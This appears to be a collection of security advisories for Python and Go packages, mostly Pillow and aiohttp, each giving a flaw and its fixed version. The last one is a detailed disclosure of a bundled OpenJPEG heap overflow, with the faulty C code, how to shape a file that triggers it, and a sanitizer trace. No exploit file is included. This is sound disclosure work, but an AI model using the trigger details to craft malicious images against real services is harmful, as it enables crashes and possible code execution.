Vulnerabilities.Title: golang.org/x/net/html: golang.org/x/net/html: Denial of Service via crafted HTML input
Vulnerabilities.Description: When coalescing adjacent text nodes in addText and fosterParent, appending to an existing TextNode's Data via string concatenation (n.Data += text) reallocated and copied the accumulated string on every token. Inputs containing many short text runs separated by ignored end tags (such as "a</x>") caused O(n^2) allocations and byte copies. Accumulate coalesced text in per-node byte slices during parsing and materialize Data strings once at the end of parse.

Vulnerabilities.Title: golang.org/x/net/html: golang.org/x/net/html: Cross-Site Scripting via improper namespace handling during HTML rendering
Vulnerabilities.Description: In childTextNodesAreLiteral, walking up the tree previously stopped at the nearest foreign ancestor once an HTML integration point was found. However, that integration point may itself be a descendant of an element that was foster-parented into a foreign namespace (such as <mglyph> or <malignmark> fostered under <mtext>), causing a parser to resolve the subtree in a different foreign namespace upon re-parsing the rendered output. Continue walking the full ancestor chain and verify that every transition from a non-empty namespace occurs at an HTML integration point before emitting literal text.

Vulnerabilities.Title: aiohttp: aiohttp: Denial of Service via missing initial request timeout
Vulnerabilities.Description: AIOHTTP is an asynchronous HTTP client/server framework for asyncio and Python. Prior to 3.14.4, keepalive timeout handling is absent during the initial portion of a request. An attacker can keep an idle connection open indefinitely before sending any request data, consuming server connection capacity. This issue is fixed in version 3.14.4.

Vulnerabilities.Title: aiohttp: aiohttp: Denial of Service via file descriptor exhaustion in multipart request processing
Vulnerabilities.Description: AIOHTTP is an asynchronous HTTP client/server framework for asyncio and Python. From 2.0.0 until 3.14.4, multipart request processing can retain an unbounded number of open file descriptors. An unauthenticated attacker can consequently exhaust file descriptors with specially crafted multipart requests when a handler uses Request.post(). This issue is fixed in version 3.14.4.

Vulnerabilities.Title: aiohttp: aiohttp: Denial of Service via memory exhaustion during WebSocket frame reassembly
Vulnerabilities.Description: AIOHTTP is an asynchronous HTTP client/server framework for asyncio and Python. Prior to 3.14.4, the WebSocket reader retains one bytes object for each transport read while reassembling an incomplete frame. A malicious peer can split a frame into many tiny reads so per-object overhead substantially exceeds the payload bytes allowed by max_msg_size. The condition affects a server receiving frames from a malicious client and a client receiving frames from a malicious server, and can cause excessive memory consumption or denial of service. This issue is fixed in version 3.14.4.

Vulnerabilities.Title: aiohttp: AIOHTTP: Denial of Service via malformed HTTP responses
Vulnerabilities.Description: AIOHTTP is an asynchronous HTTP client/server framework for asyncio and Python. Prior to 3.14.3, an out-of-bounds heap read could occur in the C response parser while building an error message for a malformed response. An attacker controlled server, or possibly an accidental response, could trigger a DoS in the client. The vulnerable path was error message construction in aiohttp/_http_parser.pyx, where an llhttp error-position pointer was used to build a snippet for malformed chunked responses and malformed request or response bytes at the buffer end. This issue is fixed in version 3.14.3.

Vulnerabilities.Title: aiohttp: aiohttp: Information disclosure via unenforced Secure attribute on shared cookies
Vulnerabilities.Description: AIOHTTP is an asynchronous HTTP client/server framework for asyncio and Python. Prior to 3.14.4, the Secure attribute for a shared cookie is not enforced. An attacker can consequently cause a shared cookie marked Secure to be sent with an unencrypted request. This issue is fixed in version 3.14.4.

Vulnerabilities.Title: aiohttp: aiohttp: Denial of Service via Max-Age processing overflow
Vulnerabilities.Description: AIOHTTP is an asynchronous HTTP client/server framework for asyncio and Python. Prior to 3.14.4, Max-Age processing can overflow and skip closing a connection. An attacker can consequently exhaust the connection pool temporarily until garbage collection resolves the connections. This issue is fixed in version 3.14.4.

Vulnerabilities.Title: aiohttp: aiohttp: Security control bypass via request scheme spoofing
Vulnerabilities.Description: AIOHTTP is an asynchronous HTTP client/server framework for asyncio and Python. Prior to 3.14.4, an attacker can send an absolute-form request that causes Request.scheme to use attacker-controlled request-target scheme data instead of the connection protocol. Applications that use Request.scheme for security decisions can consequently be tricked into treating an unencrypted connection as encrypted or an encrypted connection as unencrypted. This issue is fixed in version 3.14.4.

Vulnerabilities.Title: aiohttp: aiohttp: HTTP request smuggling via ambiguous request framing
Vulnerabilities.Description: AIOHTTP is an asynchronous HTTP client/server framework for asyncio and Python. Prior to 3.14.4, the pure Python parser accepts ambiguous HTTP request framing. An unauthenticated attacker can consequently smuggle requests when an application uses AIOHTTP_NO_EXTENSIONS or otherwise runs without a standard wheel and an intermediary interprets the framing differently. This issue is fixed in version 3.14.4.

Vulnerabilities.Title: aiohttp: AIOHTTP: Denial of Service via unnegotiated WebSocket compression
Vulnerabilities.Description: AIOHTTP is an asynchronous HTTP client/server framework for asyncio and Python. Prior to 3.14.2, the WebSocket client accepts and decompresses frames with the RSV1 bit set even when the permessage-deflate extension was not negotiated, allowing a malicious server to cause unexpected CPU and memory consumption. This issue is fixed in version 3.14.2.

Vulnerabilities.Title: aiohttp: AIOHTTP: HTTP Request Smuggling via WebSocket Upgrade
Vulnerabilities.Description: AIOHTTP is an asynchronous HTTP client/server framework for asyncio and Python. Prior to 3.14.2, the HTTP parsers were vulnerable to a request smuggling attack relating to WebSocket upgrades. If using the server-side component, an attacker may be able to execute a request smuggling vulnerability using an edge case in the WebSocket upgrade procedure. A WebSocket upgrade request with a body could cause the parser to switch protocols before the complete request body was received, leaving trailing bytes to be handled as upgraded-protocol or pipelined data rather than normal HTTP body data. This issue is fixed in version 3.14.2.

Vulnerabilities.Title: aiohttp: aiohttp: Host-Only cookie protection bypass via untrusted subdomain
Vulnerabilities.Description: AIOHTTP is an asynchronous HTTP client/server framework for asyncio and Python. Prior to 3.14.4, Host-Only scope on an existing parent-domain cookie can be removed by a subdomain. A user who accesses an untrusted subdomain can consequently have host-only protections stripped from cookies, although impact is limited when applications do not reflect those cookies to a browser. This issue is fixed in version 3.14.4.

Vulnerabilities.Title: certifi bundles emSign root CAs with compromised intermediate CA keys
Vulnerabilities.Description:
Certifi versions before 2026.10.18 include the `emSign ECC Root CA - G3` root certificate in their bundled CA store. Eight eMudhra intermediate CA certificates that chain to this root have compromised private keys and the CA has revoked them. 

An attacker with one of the compromised keys can issue valid-looking certificates for any hostname. If the attacker is also on-path, they can intercept or modify TLS traffic from clients that trust the certifi bundle. Examples include `requests`, `urllib3` and `pip`, and the Python.org macOS installer.

Certifi 2026.10.18 removed all emSign roots from the bundle. Certifi 2026.10.19 restored the emSign roots that are not affected. Upgrade to 2026.10.19 or later, and rebuild container images that vendor certifi.

Vulnerabilities.Title: python-cryptography: python-cryptography: PKCS#7 EnvelopedData decryption exposes a Bleichenbacher oracle through distinguishable errors and timing
Vulnerabilities.Description: cryptography is a package designed to expose cryptographic primitives and recipes to Python developers. From 44.0.0 until 50.0.0, pkcs7_decrypt_der, pkcs7_decrypt_pem, and pkcs7_decrypt_smime reported the outcome of decrypting a RecipientInfo's encryptedKey in several distinguishable ways, one of which disclosed the exact length recovered from the RSA operation. The same distinction was also observable by timing. An application that decrypts attacker-supplied EnvelopedData and reflects the outcome gives the attacker a Bleichenbacher oracle against the content-encryption key. Decryption ran as RSA PKCS#1 v1.5 decrypt of encryptedKey, build an AES cipher from the result, then AES-CBC decrypt and PKCS#7 unpad. Invalid RSA padding, a valid padding with a bad key length, a correct length with a wrong key, and the real key each failed or succeeded differently. Case 1 is reachable only where the linked library lacks implicit rejection: OpenSSL 3.0 and 3.1, LibreSSL, and BoringSSL. Exploitation requires a service that auto-decrypts untrusted EnvelopedData matching the victim certificate and answers adaptively at high volume, such as an S/MIME gateway or mail filter. This issue is fixed in 50.0.0.

Vulnerabilities.Title: python-cryptography: python-cryptography: Duplicate self-signed intermediates can cause exponential path-building
Vulnerabilities.Description: python-cryptography is a package designed to expose cryptographic primitives and recipes to Python developers. In versions 42.0.0 through 48.0.0, when resolving invalid certificate chains that include duplicate copies of self-signed certificates, the processing recursively invokes the same candidate, leading to an exponential blowup. Although the limitation that the chain depth cannot exceed a specified maximum depth prevents unbounded recursion and guarantees termination, an attacker-controlled certificate chain can lead the processing to easily take more than 5s to reject in testing. This amplification could form the basis for a resource exhaustion denial of service attack. The core issue arises in the recursive nature of build_chain_inner, which does not de-duplicate against previously analyzed candidates. As the correctness of validation is not affected, the integrity of a system cannot be compromised through this vector, only its availability. This issue is fixed in 49.0.0.

Vulnerabilities.Title: Vulnerable OpenSSL included in cryptography wheels
Vulnerabilities.Description:
pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in wheels prior to cryptograph 48.01 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://openssl-library.org/news/secadv/20260609.txt.

If you are building cryptography source ("sdist") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.

Vulnerabilities.Title: python-cryptography: python-cryptography: python-cryptography verifier accepts wildcard DNS names allowing escape from permittedSubtrees
Vulnerabilities.Description: cryptography is a package designed to expose cryptographic primitives and recipes to Python developers. In versions 45.0.0 through 48.0.0, if an intermediate constrained CA permits the DNS name foo.example.com, and the leaf certificate has a wildcard in its DNS SAN of *.example.com, python-cryptography's verifier accepts which allows escaping outside of the permitted names. The core issue is in DNSConstraint::matches, where a wildcard pattern was treated as matching a more-specific permitted constraint even though *.example.com can expand to sibling names such as bar.example.com outside foo.example.com. This allows acceptance of an invalid certificate chain. This issue is fixed in 49.0.0.

Vulnerabilities.Title: multidict: multidict: Denial of Service via memory leak in items-view operations
Vulnerabilities.Description: Multidict is an implementation of a multidict data structure. From 6.7.0 until 6.9.1, the C extension's items-view reflected union operation, operand | d.items(), in multidict_itemsview_or2_impl and subtraction operation, d.items() - operand, in multidict_itemsview_sub1_impl fail to release new key-identity and value references returned for each operand element. Applications that perform these operations over attacker-influenced sequences can leak two strong references per element, and garbage collection cannot reclaim them, so repeated operations can cause unbounded process memory growth and denial of service. Forward union, intersection, non-tuple operand elements, and pure-Python builds are not affected by this reference leak. This issue is fixed in version 6.9.1.

Vulnerabilities.Title: opentelemetry-api: opentelemetry-api: Denial of Service via regular expression backtracking in header parsing
Vulnerabilities.Description: OpenTelemetry Python provides the Python API and SDK for OpenTelemetry. Prior to 1.45.1, the opentelemetry-api function TraceState.from_header in opentelemetry/trace/span.py, reached through TraceContextTextMapPropagator.extract, parses inbound W3C tracestate headers with an unbounded optional-whitespace regular expression. A malformed header containing a long run of spaces or tabs without a following comma causes quadratic backtracking before the member-count limit is applied. Services using the default W3C Trace Context propagator can therefore spend excessive CPU time on one unauthenticated request when the HTTP server, parser, gateway, or custom carrier accepts a sufficiently large header. The processing can occupy a synchronous worker or delay unrelated requests on the same asynchronous event loop. The impact is limited to availability and does not expose or modify telemetry data or allow code execution. This issue is fixed in version 1.45.1.

Vulnerabilities.Title: pillow: Pillow: Heap buffer overflow in _tiffWriteProc when saving TIFF to BytesIO
Vulnerabilities.Description: Pillow is a Python imaging library. From 2.0.0 until 13.0.0, Pillow has a heap buffer overflow and stale-heap disclosure in _tiffWriteProc when saving compressed TIFF data through libtiff to a target without a usable fileno(), such as BytesIO. The callback sizes its allocation from the prior buffer size instead of the current write position, allowing an attacker-controlled out-of-line TIFF tag or retained ICC profile to be copied beyond the allocation after libtiff seeks forward. This overflow can crash the process and may allow code execution. Independently, unwritten alignment gaps in compressed TIFF output larger than 64 KiB can disclose stale heap bytes without a crafted tag. File paths and targets with real file descriptors are unaffected. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: Pillow: Heap buffer overflow in FlashPix (FPX) JPEG decoding leads to code execution
Vulnerabilities.Description: Pillow is a Python imaging library. Prior to 13.0.0, Pillow's FlashPix JPEG-tile decoder can write decoded scanlines beyond the allocated tile buffer. FlashPix (FPX) JPEG decoding selects raw mode LA with two bytes per pixel, while an unrecognized JPEG mode can be decoded as JCS_UNKNOWN with four components, causing ImagingJpegDecode to write four-component scanlines into the two-byte tile buffer. An attacker can supply a crafted OLE2 FlashPix file to an application with the optional olefile dependency installed that opens or thumbnails untrusted input. This can corrupt heap memory and may allow arbitrary code execution. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: Pillow: Heap buffer overflow in ImagingJpegDecode
Vulnerabilities.Description: Pillow is a Python imaging library. Prior to 13.0.0, Pillow's JPEG decoder can write a full-width scanline into a buffer sized for a requested draft scale. ImagingJpegDecode does not verify libjpeg's actual output width and component count after scaling is requested, and an 8-bit lossless SOF3 JPEG decoded by a build linked to libjpeg-turbo 3.x can ignore the requested downscaling geometry. An attacker can supply such a JPEG to an application that uses draft() or thumbnail() to request downscaling. This can corrupt heap memory, crash the process, or potentially allow code execution. Older libjpeg-turbo 2.x and IJG builds reject the SOF3 input. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: Pillow: Argument Injection in Ghostscript call, potentially leading into RCE
Vulnerabilities.Description: Pillow is a Python imaging library. From 2.6.0 until 13.0.0, Pillow is vulnerable to argument injection when invoking Ghostscript for EPS input. EpsImagePlugin.Ghostscript passes a caller-controlled input filename after -f without converting it to a safe absolute path, so a name beginning with a hyphen can be interpreted as a Ghostscript option. An attacker who controls the filename can inject Ghostscript arguments. Arbitrary command execution specifically requires a leading @ argument-file filename and control of the referenced text file containing additional Ghostscript arguments; the reported chain reproduces with the default -dSAFER invocation. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: Pillow multi-frame loaders can reuse stale native image storage after mode transitions
Vulnerabilities.Description: Pillow is a Python imaging library. From 11.0.0 until 13.0.0, multi-frame loaders can retain an ImagingCore allocation created for a narrow frame mode while a later frame of the same dimensions changes the logical mode and decoder tiles to wider RGB or CMYK data. ImageFile.load_prepare() reuses the stale native storage because _im is non-null without verifying that its mode and size still match. Crafted PSD, MPO, DCX, or MIC frame transitions can then write wider pixels into the narrow allocation, causing native out-of-bounds writes and crashes. The MPO path can also cause a native over-read and, in demonstrated runtime-specific profiles, command execution. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: Pillow: Denial of Service via infinite loop during crafted MIC image parsing
Vulnerabilities.Description: Pillow is a Python imaging library. From 7.2.0 until 13.0.0, Pillow can enter an infinite loop while determining the frame count of a MIC image. MicImageFile inherits TIFF frame traversal, but MicImageFile.tell reports the OLE stream index and its seek() resets TIFF frame state, so an embedded TIFF with at least three IFDs never advances. When an application with olefile installed reads n_frames or saves all frames from a crafted MIC file, the non-advancing traversal can hold a worker at full CPU indefinitely. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of Service via zero-size images in rank filters
Vulnerabilities.Description: Pillow is a Python imaging library. Prior to 13.0.0, Pillow's rank-based filters can dereference invalid image storage for a zero-size image. ImagingExpand() allocates a non-empty output and then faults while replicating edges by reading the first pixel from empty input storage; ImagingRankFilter is never reached. An attacker can supply or cause creation of a zero-size image to an application that applies a rank, median, minimum, or maximum filter. This causes a native process crash. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of Service via out-of-bounds memory access on zero-width images
Vulnerabilities.Description: Pillow is a Python imaging library. Prior to 13.0.0, Pillow's ImageMorph.MorphOp.apply() can access memory before a row buffer for a zero-width image. PPM and PGM input can create an image with width zero, and the native morphology routine indexes outrow[width - 1] without rejecting that geometry. An attacker can supply such an image to an application that applies a morphology operation. This can crash the process. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of service via crafted APNG image
Vulnerabilities.Description: Pillow is a Python imaging library. From 8.1.0 until 13.0.0, Pillow can allocate an APNG disposal background at the full canvas size before applying the decompression-bomb check. A crafted APNG with a small first frame, a very large declared canvas, and background disposal or first-frame OP_PREVIOUS reaches PngImageFile._seek while Image.open() positions frame zero. The full-canvas allocation occurs inside Image.open() without requiring pixel loading or frame iteration. This can exhaust memory and deny service. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of Service via memory exhaustion from crafted GIF image
Vulnerabilities.Description: Pillow is a Python imaging library. From 9.2.0 until 13.0.0, Pillow can retain a rejected GIF frame size after a decompression-bomb exception. In GifImageFile._seek, a crafted GIF can leave rejected dimensions stored after Image.DecompressionBombError; if an application catches that exception and continues processing the same image object, later seek or load operations allocate according to those dimensions and can exhaust memory, denying service. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of service via double free during image transformation
Vulnerabilities.Description: Pillow is a Python imaging library. Prior to 13.0.0, Pillow can double free image memory when ImagingScaleAffine encounters a selective allocation failure. The affected fast path handles Transform.EXTENT or pure scale-and-translate Transform.AFFINE operations with the default NEAREST resampling. The output image allocation must succeed while the additional per-column lookup allocation fails, after which the error path deletes image storage that later cleanup releases again. An attacker who can drive such a large Image.transform() operation under memory pressure may trigger the failure. This can crash the process and may corrupt memory. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: Pillow: Denial of Service via out-of-bounds read in TIFF decoding
Vulnerabilities.Description: Pillow is a Python imaging library. From 8.1.0 until 13.0.0, Pillow's TIFF tile and RGBA decode paths can read beyond row data produced by libtiff. In _decodeTile and the RGBA unpacker path, when Pillow and libtiff interpret duplicated PhotometricInterpretation or BitsPerSample tags differently, Pillow does not verify that the required input row fits inside the row libtiff produced, while the strip path has this validation. Loading pixels from such a crafted TIFF can expose adjacent heap data in output pixels or crash the process. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: Pillow: Denial of Service via null pointer dereference in Image.merge()
Vulnerabilities.Description: Pillow is a Python imaging library. From 12.0.0 until 13.0.0, Pillow's Image.merge() can dereference a null image8 plane. Validation skips the first input band, allowing a 32-bit integer or floating-point image backed by image32 storage to be merged as a narrower multiband image. A crafted IPTC file can reach this path when an application opens and loads it, or a caller can invoke Image.merge() directly with such a first band. This causes a native process crash. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of Service via infinite loop during PDF page rewriting
Vulnerabilities.Description: Pillow is a Python imaging library. From 5.1.0 until 13.0.0, Pillow can enter an infinite loop while rewriting PDF pages. PdfParser.rewrite_pages() follows Parent relationships without detecting a cycle in the page tree. An attacker can supply a cyclic PDF to an application that appends an image to that PDF. This can hold the worker at full CPU and deny service. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of Service via unbounded memory expansion in MSP image decoder
Vulnerabilities.Description: Pillow is a Python imaging library. From 4.1.0 until 13.0.0, Pillow's MSP RLE decoder can expand a small file into an unbounded in-memory buffer. The decoder writes run-length output to BytesIO without limiting expansion to the declared image size. An attacker can supply a crafted MSP image to an application that loads its pixels. This can exhaust memory and deny service even when the declared pixel count passes the decompression-bomb check. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: Pillow: Denial of Service via invalid pointer free during font rendering
Vulnerabilities.Description: Pillow is a Python imaging library. From 10.0.0 until 13.0.0, Pillow can free an invalid glyph pointer during FreeType rendering with an active stroker. If FT_Load_Glyph fails, cleanup may call FT_Done_Glyph on an uninitialized or stale glyph variable. An attacker can supply a malformed font as untrusted bytes to an application that draws text with a nonzero stroke width, forcing the glyph-load failure path. This can corrupt memory or crash the process. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of Service via crafted multi-frame image conversion
Vulnerabilities.Description: Pillow is a Python imaging library. From 5.1.0 until 13.0.0, Pillow takes quadratic time to reserve PDF object identifiers when saving many frames with save_all enabled. PdfParser.next_object_id() repeatedly rebuilds and scans all previously reserved identifiers for every object. An attacker can supply a multi-frame image, including a small APNG with a large declared frame count, to an application that converts it to a multipage PDF. This can consume excessive CPU and deny service. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of service via crafted PDF during append operations
Vulnerabilities.Description: Pillow is a Python imaging library. From 5.1.0 until 13.0.0, Pillow can exhaust resources while parsing an existing PDF during an append operation. PdfParser follows page-tree child references without cycle or duplication tracking and follows previous-trailer chains with only an exact repeated-offset guard, so deep or cyclic page trees and long chains of unique trailer offsets can exhaust the Python stack. Repeated non-cyclic /Kids references can also cause super-linear CPU and memory use. An attacker can supply such a PDF to an application that calls Image.save with PDF append enabled. This can raise an uncaught RecursionError or consume excessive CPU and memory before output is written, causing denial of service. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: Pillow: Denial of Service via out-of-bounds read in TIFF encoder
Vulnerabilities.Description: Pillow is a Python imaging library. Prior to 13.0.0, Pillow's TIFF encoder can read beyond a ColorMap buffer when retained TIFF metadata has a plane size inconsistent with BitsPerSample. A small TIFF can be opened normally and then retain a crafted ColorMap that is reused when the image is saved. An application that re-encodes the attacker's TIFF with libtiff can trigger the out-of-bounds read. This can disclose heap memory in the output or crash the process. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Information disclosure via uninitialized buffer in TIFF decoding
Vulnerabilities.Description: Pillow is a Python imaging library. From 5.3.0 until 13.0.0, Pillow can return uninitialized memory as pixels when libtiff performs a short decode of JPEG-compressed or Group 4 fax TIFF data. The _decodeStrip and _decodeTile buffers can be larger than the bytes written by libtiff, but Pillow converts the expected rows without clearing the unwritten tail. The tile path is affected from 5.3.0 and the strip path from 6.0.0. An attacker can supply a crafted TIFF to an application that loads and returns or re-encodes its pixels. This can disclose stale heap contents without memory corruption or a process crash. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: Pillow: Memory disclosure and segfault in libtiff encoder via crafted TIFF tags
Vulnerabilities.Description: Pillow is a Python imaging library. In versions through 12.3.0, the libtiff TIFF encoder can pass arguments to  TIFFSetField()  that do not match libtiff’s definition of the corresponding tag. When an application saves attacker-controlled image metadata through this encoder, crafted tag values can cause invalid memory reads, copying process memory into the encoded output or crashing the process. Applications that return the encoded output to an attacker can disclose that memory. The issue is reachable when re-saving compressed TIFF images and through certain conversions that preserve EXIF metadata into compressed TIFF output. This vulnerability is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of Service via decompression bomb bypass in SPIDER images
Vulnerabilities.Description: Pillow is a Python imaging library. Prior to 13.0.0, SpiderImageFile.seek() in src/PIL/SpiderImagePlugin.py reparses a later SPIDER stack frame and replaces self._size without rerunning Image._decompression_bomb_check(). A tiny file can use a safe first frame to pass Image.open() and then declare very large dimensions in a later mode F frame. Loading that frame allocates approximately four bytes per attacker-declared pixel and can consume multiple gigabytes of memory. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of Service via duplicate page references in PDF files
Vulnerabilities.Description: Pillow is a Python imaging library. From 5.1.0 until 13.0.0, PdfParser.linearize_page_tree() in src/PIL/PdfParser.py treats a PDF /Pages graph as a tree without tracking duplicate indirect references. When Image.save(..., format="PDF", append=True) processes an attacker-controlled existing PDF whose /Kids arrays repeatedly reference the same child /Pages node, Pillow expands the shared subtree as distinct pages. A compact malformed PDF can therefore create exponentially many page references and consume disproportionate CPU before the append completes. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: Pillow: Denial of Service via negative archive member size in TarIO
Vulnerabilities.Description: Pillow is a Python imaging library. Prior to 13.0.0, the TarIO initializer in src/PIL/TarIO.py accepts a negative octal member size and computes a backward seek that returns to the same 512-byte header. When the requested member name does not match, the parser repeatedly reads that header, consumes a full CPU core, and never returns. TarIO is reached only when an application directly uses PIL.TarIO.TarIO rather than the default Image.open() path. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Denial of Service via repeated EXIF headers
Vulnerabilities.Description: Pillow is a Python imaging library. From 11.0.0 until 13.0.0, Exif.load() in src/PIL/Image.py repeatedly slices the remaining EXIF data while it begins with the six-byte Exif header. src/PIL/PngImagePlugin.py accepts an uncapped PNG eXIf chunk, so a file filled with repeated headers causes a new shrinking copy on every iteration and quadratic CPU work. The condition is reachable through Image.getexif(), Image._getexif(), and ImageOps.exif_transpose(), including common photo-upload rotation workflows. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: Pillow: Denial of Service via out-of-bounds read in metafile parser
Vulnerabilities.Description: Pillow is a Python imaging library. Prior to 13.0.0 on Windows, src/PIL/WmfImagePlugin.py passes unchecked 32-bit WMF or EMF dimensions to the native drawwmf handler in src/display.c. The handler sizes a DIB allocation from 16-bit-truncated bcWidth and bcHeight fields but copies pixel data using the original full dimensions. A crafted wide, short metafile can pass the pixel-count decompression-bomb check and make the Windows-only renderer read beyond the heap buffer, potentially disclosing memory or crashing the process. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: pillow: pillow: Arbitrary code execution via JPEG encoder buffer overflow
Vulnerabilities.Description: Pillow is a Python imaging library. From 9.4.0 until 13.0.0, ImagingJpegEncode() in src/libImaging/JpegEncode.c can call jpeg_write_marker() for a JPEG COM comment when an ICC profile has exactly filled the 65536-byte encoder buffer. libjpeg writes one byte before checking the exhausted free_in_buffer counter, which then wraps and permits the attacker-controlled comment and subsequent compressed image data to overwrite adjacent heap memory. Re-saving an untrusted image as JPEG while preserving its ICC profile and forwarded comment can crash the process and may enable code execution in suitable runtime and heap layouts. This issue is fixed in version 13.0.0.

Vulnerabilities.Title: Pillow: Bundled libopenjp2 2.5.4 in all wheels since 11.1.0 carries OSV-2025-219 heap-buffer-overflow write reachable from Image.open().load()
Vulnerabilities.Description:
### Summary

Every Pillow wheel from 11.1.0 onward bundles a libopenjp2 containing a heap-buffer-overflow **write** that is fixed upstream on master but has never appeared in an OpenJPEG release. See https://osv.dev/vulnerability/OSV-2025-219

Because the wheel bundles its own copy, a patched host OS does not help. It is reachable from `Image.open(fp); im.load()` with default settings.

I am reporting it here rather than only upstream because Pillow is where the vulnerable binary actually reaches users.

Note the inversion that makes this easy to miss: **OpenJPEG 2.5.2 and earlier are safe.** The bug was introduced in `954c6e3c` (2024-06-25), so keeping the dependency current is what creates the exposure.

### Details

## Affected wheels

From `.github/dependencies.json` (`openjpeg`) at each tag:

| Pillow | bundled OpenJPEG | status |
|---|---|---|
| 10.4.0 | 2.5.2 | safe |
| 11.0.0 | 2.5.2 | safe |
| **11.1.0, 11.2.1, 11.3.0** | **2.5.3** | **affected** |
| **12.0.0 … 12.3.0** | **2.5.4** | **affected** |

Confirmed on an installed wheel: `PIL.features.version_codec('jpg_2000')` → `2.5.4`, bundled file `pillow.libs/libopenjp2-*.so.2.5.4`. `main` still pins `2.5.4` as of 2026-10-06.

## The defect

`src/lib/openjp2/j2k.c`, in `opj_j2k_read_sod`:

```c
OPJ_UINT32 l_current_tile_part =
    l_cstr_index->tile_index[p_j2k->m_current_tile_number].current_tpsno;
l_cstr_index->tile_index[...].tp_index[l_current_tile_part].end_header = l_current_pos;
l_cstr_index->tile_index[...].tp_index[l_current_tile_part].end_pos   =
    l_current_pos + p_j2k->m_specific_param.m_decoder.m_sot_length + 2;
```

`tp_index` is neither null-checked nor bounds-checked, and `l_current_tile_part` comes directly from the one-byte `TPsot` field of the SOT marker.

The correct guard already exists a few lines later in `opj_j2k_add_tlmarker` (j2k.c:8459), writing the **same array at the same index** behind `if (tp_index && l_current_tile_part < nb_tps)`. One writer checked, its sibling not.

Reached by giving the codestream a *valid* TLM marker — so `tp_index` is allocated once by `opj_j2k_build_tp_index_from_tlm`, sized to the TLM entry count, and `opj_j2k_read_sot` then skips all resizing — while setting `TNsot = 0` in every SOT, which keeps the TLM "valid" and lets `TPsot` walk past the allocation.

## Patch status

Fixed upstream in `91d08b11` ("Fix heap buffer overlfow in opj_j2k_read_sod", 2026-02-10).

The newest OpenJPEG tag is **v2.5.4 (2025-09-20)**, and `compare/v2.5.4...91d08b11` reports *ahead 6, behind 0* — the fix is **in no release, 8 months on**.

## Suggested remediation

1. Carry `91d08b11` as a patch in the wheel build until an OpenJPEG release includes it — three lines, identical to a guard already present in the same file.
2. Consider asking OpenJPEG to cut a release; they have had an unreleased memory-corruption fix on master since February 2026, and every distro is shipping the vulnerable code.
3. Your security handbook already tells applications to block EPS at the application layer. A similarly explicit note that `Image.open()` ignores filename/Content-Type and will reach any compiled-in codec unless `formats=` is passed would help downstream apps a lot.

## Not a Pillow bug, but relevant: the extension allowlist most apps rely on does not apply

`Image.open()` sniffs magic bytes, so a JPEG 2000 codestream in a file named `avatar.png` declared `Content-Type: image/png` reaches the JP2 decoder anyway.

I verified this against a production service documenting PNG/JPEG-only uploads: it accepted and fully decoded a JP2 through exactly that path, with 16 formats reachable from one upload endpoint against 43 registered openers. That service has since fixed it by passing `formats=` and validating on the detected format rather than the client's `Content-Type`.

That is the reason a decoder-level issue like this one has much wider reach than downstream maintainers tend to assume.

### Proof of concept

ASan build of OpenJPEG 2.5.4 interposed under a **stock Pillow 12.3.0**, running `Image.open(p); im.load()`:

```
==766332==ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 8
    #0 opj_j2k_read_sod          j2k.c:5086
    #1 opj_j2k_read_tile_header  j2k.c:9912
    #2 opj_read_tile_header      openjpeg.c:575
    #3 j2k_decode_entry          src/libImaging/Jpeg2KDecode.c:793
    #4 ImagingJpeg2KDecode       src/libImaging/Jpeg2KDecode.c:949
    #5 _decode                   src/decode.c:132
located 8 bytes to the right of a 24-byte region allocated by
    opj_j2k_build_tp_index_from_tlm j2k.c:8939
```

Frames 3–5 are Pillow's own decoder, not a synthetic harness. No non-default decoder options are involved; strict mode is on, which is Pillow's behaviour since Pillow never calls `opj_decoder_set_strict_mode`. A benign twin image runs the same path cleanly and returns a valid image, so this is the payload and not a parse failure.

I have deliberately **not** attached the PoC file to this initial report. I'm happy to attach the PoC, the builder script and the RIP-control harness here on request, or hold everything until a fix is ready.

No disclosure deadline from me; I will not publish anything while this is being worked on.

### Impact

Any application that calls `Image.open()` / `im.load()` on an image it did not produce — the overwhelmingly common case for upload handlers, thumbnailers and preview pipelines — can be made to perform an out-of-bounds heap write by supplying one crafted file.

**Floor, already certain.** On a stock non-sanitised wheel the overflow performs 245 writes walking to +5856 bytes past a 24-byte allocation, and glibc's own heap-metadata checker aborts the process (`corrupted size vs. prev_size`, `corrupted double-linked list`, SIGABRT). One file reliably kills a long-lived worker.

